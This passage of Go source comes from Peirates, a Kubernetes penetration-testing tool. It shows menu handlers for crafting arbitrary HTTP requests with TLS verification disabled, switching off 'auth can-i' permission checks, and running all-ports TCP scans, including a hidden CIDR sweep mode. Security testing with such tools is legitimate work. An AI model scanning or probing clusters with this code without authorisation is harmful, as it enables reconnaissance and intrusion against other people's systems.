			// TODO: Can we abstract the HTTP portion of this into http_utils.go
			//       the way we did with GetRequest()?

			// Set up an http client
			httpClient := &http.Client{}
			if httpsPresent {
				tr := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				}
				httpClient = &http.Client{Transport: tr}
			}

			// Get the HTTP method
			method := "--undefined--"
			for (method != "GET") && (method != "POST") {
				fmt.Println("[+] Enter method - only GET and POST are supported: ")
				input, _ = ReadLineStripWhitespace()
				method = strings.TrimSpace(strings.ToUpper(input))
			}

			// Store the headers in a list
			var headers []HeaderLine

			inputHeader := "undefined"

			fmt.Println("[+] Specify custom header lines, if desired, entering the Header name, hitting Enter, then the Header value.")
			for inputHeader != "" {
				// Request a header name

				fmt.Println("[+] Enter a header name or a blank line if done: ")
				input, _ = ReadLineStripWhitespace()

				inputHeader = strings.TrimSpace(input)

				if inputHeader != "" {
					// Request a header rhs (value)
					fmt.Println("[+] Enter a value for " + inputHeader + ":")
					input, _ = ReadLineStripWhitespace()

					// Add the header value to the list
					var header HeaderLine
					header.LHS = inputHeader
					header.RHS = input
					headers = append(headers, header)
				}

			}

			inputParameter := "--undefined--"

			// Store the parameters in a map
			params := map[string]string{}

			fmt.Println("[+] Now enter parameters which will be placed into the query string or request body.\n")
			fmt.Println("    If you set a Content-Type manually to something besides application/x-www-form-urlencoded, use the parameter name a line of text and leave the value blank.\n")

			for inputParameter != "" {
				// Request a parameter name

				fmt.Println("[+] Enter a parameter or a blank line to finish entering parameters: ")
				inputParameter, _ = ReadLineStripWhitespace()

				if inputParameter != "" {
					// Request a parameter value
					fmt.Println("[+] Enter a value for " + inputParameter + ": ")
					input, _ = ReadLineStripWhitespace()

					// Add the parameter pair to the list
					params[inputParameter] = url.QueryEscape(input)
				}

			}

			var paramLocation string
			for (paramLocation != "url") && (paramLocation != "body") {
				fmt.Println("\nWould you like to place parameters in the URL (like in a GET query) or in the body (like in a POST)\nurl or body: ")
				paramLocation, err = ReadLineStripWhitespace()
				if err != nil {
					continue
				}
				paramLocation = strings.ToLower(paramLocation)
			}

			// Make the request and get the response.
			request, err := createHTTPrequest(method, fullURL, headers, paramLocation, params)

			response, err := httpClient.Do(request)

			////// END thing to be abstracted

			if err != nil {
				fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", fullURL, err.Error())
				response.Body.Close()
				continue
			}
			if response.Status != "200 OK" {
				fmt.Printf("[-] Error - response code: %s\n", response.Status)
				continue
			}
			defer response.Body.Close()
			responseBody, _ := ioutil.ReadAll(response.Body)
			responseBodyString := string(responseBody)
			println(responseBodyString)
			println("")
		// [92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
		case "92", "set-auth-can-i":
			// Toggle UseAuthCanI between true and false
			println("\nWhen Auth-Can-I is set to true, Peirates uses the kubectl auth can-i feature to determine if an action is permitted before taking it.")
			println("Toggle this to false if auth can-i results aren't accurate for this cluster.")
			println("Auth-Can-I is currently set to ", UseAuthCanI)
			println("\nPlease choose a new value for Auth-Can-I:")
			println("[true] Set peirates to check whether an action is permitted")
			println("[false] Set peirates to skip the auth can-i check")
			println("[exit] Leave the setting at its current value")

			println("\nChoice: ")

			fmt.Scanln(&input)

			switch strings.ToLower(input) {
			case "exit":
				continue
			case "true", "1", "t":
				UseAuthCanI = true
			case "false", "0", "f":
				UseAuthCanI = false
			}

		// [93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
		case "93", "tcpscan", "tcp scan", "portscan", "port scan":

			var matched bool

			for !matched {
				println("Enter an IP address to scan or hit enter to exit the portscan function: ")
				fmt.Scan(&input)
				if input == "" {
					break
				}
				check_pattern_1, err := regexp.Match(`^\s*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s*$`, []byte(input))
				if err != nil {
					println("Error on regexp match against IP address pattern.")
					continue
				}
				if check_pattern_1 {
					// Scan an IP
					println("Scanning " + input)
					scan_controller(input)
					break
				} else {
					check_pattern_2, err := regexp.Match(`^\s*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(\/[0,1,2,3]?\d)\s*$`, []byte(input))
					if err != nil {
						println("Error on regexp match against ip/bits CIDR pattern.")
						continue
					}
					if check_pattern_2 {
						println("Hidden CIDR scan mode used - this may be slow or unpredictable")
						hostList := cidrHosts(input)
						for _, host := range hostList {
							println("Scanning " + host)
							scan_controller(host)
						}
						break
					} else {
						println("Error: input must match an IP address or a CIDR formatted network.")
						continue
					}

				}
			}

			// Check input

		default:
			fmt.Println("Command unrecognized.")
		}

		clearScreen()
	}
}

func printBanner() {
	println(`________________________________________
|  ___  ____ _ ____ ____ ___ ____ ____ |
|  |__] |___ | |__/ |__|  |  |___ [__  |
|  |    |___ | |  \ |  |  |  |___ ___] |
|______________________________________|
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
,,..IIIIIIIII.............IIIIIIIII..,,,
,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
,..IIIIIIII...+++++++++++,..+IIIIIII..,,
,..IIIIIII...+++++++++++++:..~IIIIII..,,
,..IIIIII...++++++:++++++++=..,IIIII..,,
,..IIIII...+....,++.++++:+.++...IIII..,,
,,.+IIII...+..,+++++....+,.+...IIIII..,,
,,..IIIII...+++++++++++++++...IIIII..:,,
,,,..IIIII...+++++++++++++...IIIII7..,,,
,,,,.,IIIII...+++++++++++...?IIIII..,,,,
,,,,:..IIIII...............IIIII?..,,,,,
,,,,,,..IIIII.............IIIII..,,,,,,,
,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
________________________________________
	Peirates v1.1.3 by InGuardians
  https://www.inguardians.com/peirates
----------------------------------------------------------------`)
}
